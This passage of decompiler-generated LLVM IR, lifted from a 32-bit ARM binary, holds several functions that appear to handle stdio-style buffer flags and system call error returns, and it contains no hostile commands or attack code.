  %v3_12354 = phi i32 [ %v5_1236c, %dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge ], [ %arg3, %dec_label_pc_12334 ]
  %v0_12354 = icmp slt i32 %v0_12354.in, 0
  %storemerge = select i1 %v0_12354, i32 %v3_12350, i32 %v3_12354
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_12358, i32* %r1.global-to-local, align 4
  %v1_1235c = add i32 %v0_1235c, 4
  %v2_1235c = inttoptr i32 %v1_1235c to i32*
  %v3_1235c = load i32, i32* %v2_1235c, align 4
  %v3_12360 = call i32 @function_e840(i32 %v3_1235c, i32 %v0_12358)
  %v1_12364 = icmp slt i32 %v3_12360, 0
  %v2_12364 = icmp eq i32 %v3_12360, 0
  store i1 %v2_12364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_12364, label %dec_label_pc_12374, label %dec_label_pc_123f8thread-pre-split

dec_label_pc_12374:                               ; preds = %dec_label_pc_12350
  %v0_12374 = load i32, i32* @r4, align 4
  %v1_12374 = inttoptr i32 %v0_12374 to i16*
  %v2_12374 = load i16, i16* %v1_12374, align 2
  %v1_12378 = or i16 %v2_12374, 8
  store i16 %v1_12378, i16* %v1_12374, align 2
  store i32 44872, i32* %r3.global-to-local, align 4
  %v0_12384 = call i32 @function_f150()
  %v3_12388 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_12388 = sext i16 %v3_12388 to i32
  store i32 %v4_12388, i32* %r3.global-to-local, align 4
  %v2_1238c = add i32 %v4_12388, %v0_12384
  %v3_1238c = inttoptr i32 %v2_1238c to i32*
  %v4_1238c = load i32, i32* %v3_1238c, align 4
  store i32 %v4_1238c, i32* %r3.global-to-local, align 4
  %v7_12390 = icmp eq i32 %v4_1238c, 4
  store i1 %v7_12390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12390, label %dec_label_pc_1239c, label %bb21

bb21:                                             ; preds = %dec_label_pc_12374
  %v8_12394 = icmp eq i32 %v4_1238c, 11
  store i1 %v8_12394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12394, label %dec_label_pc_1239c, label %dec_label_pc_12400

dec_label_pc_1239c:                               ; preds = %dec_label_pc_12374, %bb21
  %v0_1239c = load i32, i32* @r4, align 4
  %v1_1239c = add i32 %v0_1239c, 8
  store i32 %v1_1239c, i32* %r2.global-to-local, align 4
  %v1_123a0 = inttoptr i32 %v1_1239c to i32*
  %v2_123a0 = load i32, i32* %v1_123a0, align 4
  store i32 %v2_123a0, i32* %r2.global-to-local, align 4
  %v3_123a0 = add i32 %v0_1239c, 12
  %v4_123a0 = inttoptr i32 %v3_123a0 to i32*
  %v5_123a0 = load i32, i32* %v4_123a0, align 4
  store i32 %v5_123a0, i32* %r3.global-to-local, align 4
  %v2_123a4 = sub i32 %v5_123a0, %v2_123a0
  store i32 %v2_123a4, i32* %r1.global-to-local, align 4
  %v9_123a4 = icmp eq i32 %v5_123a0, %v2_123a0
  store i1 %v9_123a4, i1* %cpsr_z.global-to-local, align 1
  %v0_123f0.pre = load i32, i32* @r5, align 4
  br i1 %v9_123a4, label %dec_label_pc_123f0, label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %dec_label_pc_1239c
  %v3_123ac = icmp ult i32 %v2_123a4, %v0_123f0.pre
  %v9_123ac = icmp eq i32 %v2_123a4, %v0_123f0.pre
  store i1 %v9_123ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_123ac, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_123ac
  store i32 %v0_123f0.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_123ac, %bb22, %dec_label_pc_123d4
  %v2_123c0 = phi i32 [ %v1_123d8, %dec_label_pc_123d4 ], [ %v2_123a0, %bb22 ], [ %v2_123a0, %dec_label_pc_123ac ]
  %v0_123b4 = load i32, i32* @r6, align 4
  %v1_123b4 = inttoptr i32 %v0_123b4 to i8*
  %v2_123b4 = load i8, i8* %v1_123b4, align 1
  %v3_123b4 = zext i8 %v2_123b4 to i32
  store i32 %v3_123b4, i32* %r3.global-to-local, align 4
  %v7_123b8 = icmp eq i8 %v2_123b4, 10
  store i1 %v7_123b8, i1* %cpsr_z.global-to-local, align 1
  %v1_123bc = add i32 %v0_123b4, 1
  store i32 %v1_123bc, i32* @r6, align 4
  %v3_123c0 = inttoptr i32 %v2_123c0 to i8*
  store i8 %v2_123b4, i8* %v3_123c0, align 1
  %v0_123c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_123c4, label %dec_label_pc_123c8, label %dec_label_pc_123d4

dec_label_pc_123c8:                               ; preds = %.preheader
  %v0_123c8 = load i32, i32* @r4, align 4
  %v1_123c8 = inttoptr i32 %v0_123c8 to i16*
  %v2_123c8 = load i16, i16* %v1_123c8, align 2
  %v3_123c8 = zext i16 %v2_123c8 to i32
  store i32 %v3_123c8, i32* %r3.global-to-local, align 4
  %v1_123cc = and i32 %v3_123c8, 256
  %v2_123cc = icmp eq i32 %v1_123cc, 0
  store i1 %v2_123cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123cc, label %dec_label_pc_123d4, label %dec_label_pc_123c8.dec_label_pc_123e0_crit_edge

dec_label_pc_123c8.dec_label_pc_123e0_crit_edge:  ; preds = %dec_label_pc_123c8
  %v0_123e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_123e0

dec_label_pc_123d4:                               ; preds = %dec_label_pc_123c8, %.preheader
  %v0_123d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_123d4 = add i32 %v0_123d4, -1
  store i32 %v1_123d4, i32* %r1.global-to-local, align 4
  %v7_123d4 = icmp eq i32 %v0_123d4, 1
  store i1 %v7_123d4, i1* %cpsr_z.global-to-local, align 1
  %v0_123d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_123d8 = add i32 %v0_123d8, 1
  store i32 %v1_123d8, i32* %r2.global-to-local, align 4
  br i1 %v7_123d4, label %dec_label_pc_123d4.dec_label_pc_123e0_crit_edge, label %.preheader

dec_label_pc_123d4.dec_label_pc_123e0_crit_edge:  ; preds = %dec_label_pc_123d4
  %v0_123e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_123e0

dec_label_pc_123e0:                               ; preds = %dec_label_pc_123c8.dec_label_pc_123e0_crit_edge, %dec_label_pc_123d4.dec_label_pc_123e0_crit_edge
  %v0_123e4 = phi i32 [ %v1_123d8, %dec_label_pc_123d4.dec_label_pc_123e0_crit_edge ], [ %v0_123e4.pre, %dec_label_pc_123c8.dec_label_pc_123e0_crit_edge ]
  %v0_123e0 = phi i32 [ %v0_123e0.pre, %dec_label_pc_123d4.dec_label_pc_123e0_crit_edge ], [ %v0_123c8, %dec_label_pc_123c8.dec_label_pc_123e0_crit_edge ]
  %v1_123e0 = add i32 %v0_123e0, 8
  %v2_123e0 = inttoptr i32 %v1_123e0 to i32*
  %v3_123e0 = load i32, i32* %v2_123e0, align 4
  store i32 %v3_123e0, i32* %r3.global-to-local, align 4
  %v2_123e4 = add i32 %v0_123e0, 16
  %v3_123e4 = inttoptr i32 %v2_123e4 to i32*
  store i32 %v0_123e4, i32* %v3_123e4, align 4
  %v0_123e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_123e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_123e8 = sub i32 %v1_123e8, %v0_123e8
  store i32 %v2_123e8, i32* %r3.global-to-local, align 4
  %v1_123ec = load i32, i32* @r5, align 4
  %v2_123ec = sub i32 %v1_123ec, %v2_123e8
  br label %dec_label_pc_123f0

dec_label_pc_123f0:                               ; preds = %dec_label_pc_1239c, %dec_label_pc_123e0
  %v0_123f0 = phi i32 [ %v2_123ec, %dec_label_pc_123e0 ], [ %v0_123f0.pre, %dec_label_pc_1239c ]
  %v1_123f0 = load i32, i32* @r7, align 4
  %v2_123f0 = sub i32 %v1_123f0, %v0_123f0
  store i32 %v2_123f0, i32* @r7, align 4
  br label %dec_label_pc_12400

dec_label_pc_123f8thread-pre-split:               ; preds = %dec_label_pc_12350
  %v3_12368 = load i32, i32* @r6, align 4
  %v5_12368 = add i32 %v3_12368, %v3_12360
  store i32 %v5_12368, i32* @r6, align 4
  %v4_1236c = load i32, i32* @r5, align 4
  %v5_1236c = sub i32 %v4_1236c, %v3_12360
  store i32 %v5_1236c, i32* @r5, align 4
  %v2_123f8 = icmp eq i32 %v5_1236c, 0
  store i1 %v2_123f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123f8, label %dec_label_pc_12400, label %dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge

dec_label_pc_123f8thread-pre-split.dec_label_pc_12350_crit_edge: ; preds = %dec_label_pc_123f8thread-pre-split
  %v3_12350.pre = load i32, i32* @r8, align 4
  %v0_1235c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12350

dec_label_pc_12400:                               ; preds = %dec_label_pc_123f8thread-pre-split, %dec_label_pc_12334, %bb21, %dec_label_pc_123f0
  %v0_12400 = load i32, i32* @r7, align 4
  ret i32 %v0_12400

; uselistorder directives
  uselistorder i32 %v5_1236c, { 1, 3, 0, 2 }
  uselistorder i32 %v5_12368, { 1, 0 }
  uselistorder i32 %v0_123e0, { 1, 0 }
  uselistorder i32 %v1_123d8, { 0, 2, 1 }
  uselistorder i32 %v0_123d4, { 1, 0 }
  uselistorder i32 %v0_123f0.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_123a0, { 1, 0, 2 }
  uselistorder i32 %v2_123a0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_12360, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12358, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 1, 2, 0 }
  uselistorder i32 11, { 8, 9, 4, 5, 6, 7, 14, 15, 3, 10, 11, 1, 12, 0, 13, 16, 17, 2 }
  uselistorder i32 (i32, i32)* @function_e840, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @r8, { 0, 19, 135, 14, 136, 20, 21, 8, 22, 23, 24, 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 9, 38, 39, 40, 41, 42, 43, 44, 45, 15, 137, 16, 17, 18, 56, 57, 58, 10, 59, 60, 61, 62, 46, 47, 11, 48, 110, 111, 112, 113, 114, 13, 115, 116, 117, 118, 119, 120, 121, 122, 63, 64, 65, 66, 67, 49, 68, 69, 70, 71, 72, 73, 74, 75, 50, 123, 124, 125, 126, 127, 76, 77, 78, 79, 80, 87, 88, 81, 12, 6, 86, 82, 83, 2, 84, 7, 85, 3, 89, 90, 91, 51, 52, 53, 4, 54, 55, 92, 103, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 104, 105, 106, 107, 108, 109, 128, 130, 129, 5, 132, 133, 131, 134 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_12400, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_123f0, { 1, 0 }
  uselistorder label %dec_label_pc_123e0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1239c, { 1, 0 }
  uselistorder label %dec_label_pc_12350, { 1, 0 }
}

define i32 @function_12410(i32 %arg1) local_unnamed_addr {
dec_label_pc_12410:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12410 = load i32, i32* @r4, align 4
  store i32 %v3_12410, i32* %stack_var_-8, align 4
  %v1_12414 = add i32 %arg1, 8
  %v1_12418 = inttoptr i32 %v1_12414 to i32*
  %v2_12418 = load i32, i32* %v1_12418, align 4
  store i32 %v2_12418, i32* @r1, align 4
  %v3_12418 = add i32 %arg1, 12
  %v4_12418 = inttoptr i32 %v3_12418 to i32*
  %v5_12418 = load i32, i32* %v4_12418, align 4
  %v2_1241c = sub i32 %v5_12418, %v2_12418
  store i32 %v2_1241c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_12424 = inttoptr i32 %arg1 to i16*
  %v4_12424 = call i32 @function_122dc(i16* %v3_12424, i32 %v2_12418, i32 %v2_1241c)
  %v0_12428 = load i32, i32* @r4, align 4
  %v1_12428 = add i32 %v0_12428, 8
  %v2_12428 = inttoptr i32 %v1_12428 to i32*
  %v3_12428 = load i32, i32* %v2_12428, align 4
  store i32 %v3_12428, i32* %r2.global-to-local, align 4
  %v2_1242c = add i32 %v3_12428, %v4_12424
  %v2_12430 = add i32 %v0_12428, 20
  %v3_12430 = inttoptr i32 %v2_12430 to i32*
  store i32 %v2_1242c, i32* %v3_12430, align 4
  %v0_12434 = load i32, i32* %r2.global-to-local, align 4
  %v1_12434 = load i32, i32* @r4, align 4
  %v2_12434 = add i32 %v1_12434, 16
  %v3_12434 = inttoptr i32 %v2_12434 to i32*
  store i32 %v0_12434, i32* %v3_12434, align 4
  %v2_12438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12438, i32* @r4, align 4
  ret i32 %v4_12424

; uselistorder directives
  uselistorder i32 %v4_12424, { 1, 0 }
  uselistorder i32 12, { 6, 7, 28, 8, 105, 29, 30, 31, 32, 33, 9, 34, 35, 3, 106, 107, 108, 4, 109, 110, 111, 113, 114, 112, 115, 116, 117, 118, 119, 120, 10, 11, 12, 13, 15, 14, 16, 36, 37, 17, 18, 38, 39, 40, 41, 42, 43, 44, 56, 26, 27, 121, 2, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 0, 74, 19, 20, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 93, 86, 87, 88, 89, 90, 91, 92, 94, 95, 21, 96, 1, 97, 98, 22, 99, 100, 101, 25, 45, 49, 23, 51, 46, 47, 48, 5, 50, 52, 24, 53, 54, 55, 103, 102, 104 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_12440() local_unnamed_addr {
dec_label_pc_12440:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12440 = load i32, i32* @r4, align 4
  store i32 %v3_12440, i32* %stack_var_-12, align 4
  %v0_12444 = load i32, i32* @r0, align 4
  %v1_12444 = inttoptr i32 %v0_12444 to i16*
  %v2_12444 = load i16, i16* %v1_12444, align 2
  %v3_12444 = zext i16 %v2_12444 to i32
  store i32 %v3_12444, i32* %r3.global-to-local, align 4
  %v0_12448 = load i32, i32* @r1, align 4
  %v2_12448 = and i32 %v0_12448, %v3_12444
  %v4_12448 = icmp eq i32 %v2_12448, 0
  store i32 %v0_12444, i32* @r4, align 4
  br i1 %v4_12448, label %dec_label_pc_12458, label %dec_label_pc_12468

dec_label_pc_12458:                               ; preds = %dec_label_pc_12440
  %v1_12458 = and i32 %v3_12444, 2176
  %v2_12458 = icmp eq i32 %v1_12458, 0
  br i1 %v2_12458, label %dec_label_pc_12460, label %dec_label_pc_12474

dec_label_pc_12460:                               ; preds = %dec_label_pc_12458
  %v2_12460 = or i32 %v0_12448, %v3_12444
  store i32 %v2_12460, i32* %r3.global-to-local, align 4
  %v1_12464 = trunc i32 %v2_12460 to i16
  store i16 %v1_12464, i16* %v1_12444, align 2
  %v0_12468.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12468

dec_label_pc_12468:                               ; preds = %dec_label_pc_12440, %dec_label_pc_12460
  %v0_12468 = phi i32 [ %v0_12444, %dec_label_pc_12440 ], [ %v0_12468.pre, %dec_label_pc_12460 ]
  %v1_12468 = inttoptr i32 %v0_12468 to i16*
  %v2_12468 = load i16, i16* %v1_12468, align 2
  %v3_12468 = zext i16 %v2_12468 to i32
  store i32 %v3_12468, i32* %r3.global-to-local, align 4
  %v1_1246c = and i32 %v3_12468, 16
  store i32 %v1_1246c, i32* %r5.global-to-local, align 4
  %v2_1246c = icmp eq i32 %v1_1246c, 0
  br i1 %v2_1246c, label %dec_label_pc_1249c, label %dec_label_pc_12474

dec_label_pc_12474:                               ; preds = %dec_label_pc_12458, %dec_label_pc_12468
  store i32 44628, i32* %r3.global-to-local, align 4
  %v0_12478 = call i32 @function_f150()
  store i32 %v0_12478, i32* %r0.global-to-local, align 4
  %v3_1247c = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_1247c = sext i16 %v3_1247c to i32
  store i32 %v4_1247c, i32* %r3.global-to-local, align 4
  %v3_12484 = add i32 %v4_1247c, %v0_12478
  %v4_12484 = inttoptr i32 %v3_12484 to i32*
  store i32 9, i32* %v4_12484, align 4
  br label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %dec_label_pc_124a4, %dec_label_pc_12474
  %v0_12488 = load i32, i32* @r4, align 4
  %v1_12488 = inttoptr i32 %v0_12488 to i16*
  %v2_12488 = load i16, i16* %v1_12488, align 2
  %v3_12488 = zext i16 %v2_12488 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_12490 = or i32 %v3_12488, 8
  store i32 %v1_12490, i32* %r3.global-to-local, align 4
  %v1_12494 = trunc i32 %v1_12490 to i16
  store i16 %v1_12494, i16* %v1_12488, align 2
  %v1_124dc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124d4

dec_label_pc_1249c:                               ; preds = %dec_label_pc_12468
  %v1_1249c = and i32 %v3_12468, 64
  %v2_1249c = icmp eq i32 %v1_1249c, 0
  br i1 %v2_1249c, label %dec_label_pc_124c4, label %dec_label_pc_124a4

dec_label_pc_124a4:                               ; preds = %dec_label_pc_1249c
  %v0_124a4 = load i32, i32* @r0, align 4
  %v1_124a4 = call i32 @function_1054c(i32 %v0_124a4)
  store i32 %v1_124a4, i32* %r0.global-to-local, align 4
  %v2_124a8 = icmp eq i32 %v1_124a4, 0
  br i1 %v2_124a8, label %dec_label_pc_124b0, label %dec_label_pc_12488

dec_label_pc_124b0:                               ; preds = %dec_label_pc_124a4
  %v0_124b0 = load i32, i32* @r4, align 4
  %v1_124b0 = inttoptr i32 %v0_124b0 to i16*
  %v2_124b0 = load i16, i16* %v1_124b0, align 2
  %v3_124b0 = zext i16 %v2_124b0 to i32
  store i32 %v3_124b0, i32* %r3.global-to-local, align 4
  %v1_124b4 = add i32 %v0_124b0, 8
  %v2_124b4 = inttoptr i32 %v1_124b4 to i32*
  %v3_124b4 = load i32, i32* %v2_124b4, align 4
  %v1_124b8 = and i32 %v3_124b0, 65471
  store i32 %v1_124b8, i32* %r3.global-to-local, align 4
  %v2_124bc = add i32 %v0_124b0, 28
  %v3_124bc = inttoptr i32 %v2_124bc to i32*
  store i32 %v3_124b4, i32* %v3_124bc, align 4
  %v0_124c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_124c0 = trunc i32 %v0_124c0 to i16
  %v2_124c0 = load i32, i32* @r4, align 4
  %v3_124c0 = inttoptr i32 %v2_124c0 to i16*
  store i16 %v1_124c0, i16* %v3_124c0, align 2
  %v0_124c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_124c4

dec_label_pc_124c4:                               ; preds = %dec_label_pc_1249c, %dec_label_pc_124b0
  %v2_124cc = phi i32 [ %v0_12468, %dec_label_pc_1249c ], [ %v0_124c4.pre, %dec_label_pc_124b0 ]
  %v1_124c4 = inttoptr i32 %v2_124cc to i16*
  %v2_124c4 = load i16, i16* %v1_124c4, align 2
  %v3_124c4 = zext i16 %v2_124c4 to i32
  %v1_124c8 = or i32 %v3_124c4, 1
  store i32 %v1_124c8, i32* %r3.global-to-local, align 4
  %v1_124cc = trunc i32 %v1_124c8 to i16
  store i16 %v1_124cc, i16* %v1_124c4, align 2
  %v0_124d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_124d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124d4

dec_label_pc_124d4:                               ; preds = %dec_label_pc_12488, %dec_label_pc_124c4
  %v1_124dc = phi i32 [ %v1_124dc.pre, %dec_label_pc_12488 ], [ %v0_124d0, %dec_label_pc_124c4 ]
  %v2_124d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_124d8, i32* @r4, align 4
  ret i32 %v1_124dc

; uselistorder directives
  uselistorder i32 %v3_12444, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 11, 21, 8, 22, 23, 24, 25, 12, 13, 0, 14, 15, 9, 16, 19, 2, 10, 3, 20, 1, 4, 5, 17, 6, 18, 7 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_1054c, { 2, 1, 0 }
  uselistorder i32 64, { 38, 2, 3, 4, 5, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 33, 6, 34, 35, 7, 50, 51, 52, 53, 54, 55, 36, 37, 9, 13, 10, 14, 11, 15, 12, 16, 24, 25, 23, 26, 27, 28, 29, 30, 31, 18, 19, 20, 21, 17, 22, 8, 32, 1, 0 }
  uselistorder label %dec_label_pc_124d4, { 1, 0 }
  uselistorder label %dec_label_pc_124c4, { 1, 0 }
  uselistorder label %dec_label_pc_12474, { 1, 0 }
  uselistorder label %dec_label_pc_12468, { 1, 0 }
}

define i32 @function_124e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_124e4:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_124e4 = load i32, i32* @r4, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_124f4 = call i32 @function_bfd0()
  %v1_124f8 = load i32, i32* @r4, align 4
  %v2_124f8 = add i32 %v1_124f8, %arg1
  store i32 %v3_124e4, i32* @r4, align 4
  ret i32 %v2_124f8

; uselistorder directives
  uselistorder i32 ()* @function_bfd0, { 6, 5, 1, 4, 3, 0, 2 }
  uselistorder i32* @r2, { 11, 1, 13, 12, 14, 76, 15, 16, 2, 17, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 3, 88, 18, 19, 20, 21, 64, 65, 66, 67, 89, 90, 91, 102, 103, 104, 105, 94, 4, 95, 92, 93, 5, 6, 7, 8, 96, 97, 98, 99, 100, 101, 38, 39, 42, 41, 40, 68, 9, 69, 10, 70, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 43, 45, 46, 47, 37, 44, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 71, 0, 75, 63, 72, 73, 74 }
}

define i32 @function_12508() local_unnamed_addr {
dec_label_pc_12508:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_12508 = load i32, i32* @r1, align 4
  %v2_12508 = icmp eq i32 %v0_12508, 0
  %v3_1250c = load i32, i32* @r4, align 4
  store i32 %v3_1250c, i32* %stack_var_-8, align 4
  %v0_12510 = load i32, i32* @r0, align 4
  store i32 %v0_12510, i32* %r4.global-to-local, align 4
  br i1 %v2_12508, label %dec_label_pc_12534, label %dec_label_pc_12518

dec_label_pc_12518:                               ; preds = %dec_label_pc_12508
  %v1_12520 = add i32 %v0_12510, 260
  %v4_12524 = call i32 @function_f510(i32 0, i32* null, i32 %v1_12520)
  %v2_12528 = icmp eq i32 %v4_12524, 0
  br i1 %v2_12528, label %dec_label_pc_12538, label %dec_label_pc_12534

dec_label_pc_12534:                               ; preds = %dec_label_pc_12518, %dec_label_pc_12508
  br label %dec_label_pc_12538

dec_label_pc_12538:                               ; preds = %dec_label_pc_12518, %dec_label_pc_12534
  %storemerge = phi i32 [ 0, %dec_label_pc_12534 ], [ 1, %dec_label_pc_12518 ]
  %v1_1253c = load i32, i32* %r4.global-to-local, align 4
  %v2_1253c = add i32 %v1_1253c, 256
  %v3_1253c = inttoptr i32 %v2_1253c to i32*
  store i32 %storemerge, i32* %v3_1253c, align 4
  %v2_12540 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12540, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 256, { 69, 65, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 62, 66, 64, 67, 30, 32, 31, 33, 0, 63, 1, 34, 35, 61, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 68, 51, 52, 53, 54, 56, 55, 57, 58, 60, 59 }
  uselistorder i32* null, { 6, 3, 0, 4, 5, 1, 2, 7, 8, 9, 10 }
  uselistorder i32* @r1, { 175, 28, 29, 30, 31, 22, 3, 177, 178, 179, 180, 0, 23, 176, 32, 33, 6, 34, 35, 36, 37, 18, 38, 2, 39, 40, 17, 190, 19, 7, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 45, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 4, 67, 21, 148, 149, 150, 228, 20, 230, 231, 232, 233, 151, 152, 105, 24, 25, 229, 14, 26, 27, 153, 154, 106, 107, 108, 109, 110, 111, 112, 113, 68, 155, 8, 156, 157, 158, 159, 9, 160, 114, 115, 116, 147, 69, 70, 71, 72, 73, 74, 75, 10, 236, 237, 238, 239, 1, 240, 12, 76, 161, 117, 118, 234, 235, 119, 13, 120, 16, 181, 182, 183, 184, 185, 186, 187, 188, 189, 11, 121, 122, 125, 123, 124, 126, 162, 163, 164, 15, 127, 128, 77, 83, 78, 79, 94, 80, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 129, 130, 132, 98, 99, 100, 101, 5, 102, 103, 133, 134, 135, 136, 137, 138, 139, 140, 141, 104, 131, 142, 143, 144, 145, 146, 165, 174, 166, 167, 168, 169, 170, 171, 172, 173 }
  uselistorder label %dec_label_pc_12538, { 1, 0 }
}

define i32 @function_12548(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12548:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_12590, label %dec_label_pc_12574

dec_label_pc_12574:                               ; preds = %dec_label_pc_12548
  %v0_12578 = call i32 @function_f150()
  %v3_1257c = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_1257c = sext i16 %v3_1257c to i32
  %v0_12580 = load i32, i32* %r2.global-to-local, align 4
  %v1_12580 = sub i32 0, %v0_12580
  store i32 %v1_12580, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12588 = add i32 %v4_1257c, %v0_12578
  %v4_12588 = inttoptr i32 %v3_12588 to i32*
  store i32 %v1_12580, i32* %v4_12588, align 4
  %v0_12598.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12598

dec_label_pc_12590:                               ; preds = %dec_label_pc_12548
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_12590 = icmp eq i32 %arg1, 0
  br i1 %v2_12590, label %dec_label_pc_125a4, label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %dec_label_pc_12590, %dec_label_pc_12574
  %v0_12598 = phi i32 [ %arg1, %dec_label_pc_12590 ], [ %v0_12598.pre, %dec_label_pc_12574 ]
  %v3_1259c = ashr i32 %v0_12598, 31
  br label %dec_label_pc_125a8

dec_label_pc_125a4:                               ; preds = %dec_label_pc_12590
  br label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %dec_label_pc_12598, %dec_label_pc_125a4
  %v1_125b0 = phi i32 [ %v0_12598, %dec_label_pc_12598 ], [ %tmp8, %dec_label_pc_125a4 ]
  %storemerge = phi i32 [ %v3_1259c, %dec_label_pc_12598 ], [ %tmp, %dec_label_pc_125a4 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_125b0

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 31, { 1, 0, 3, 2, 4 }
  uselistorder i16 8, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i16* @global_var_1d2d8.209, { 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
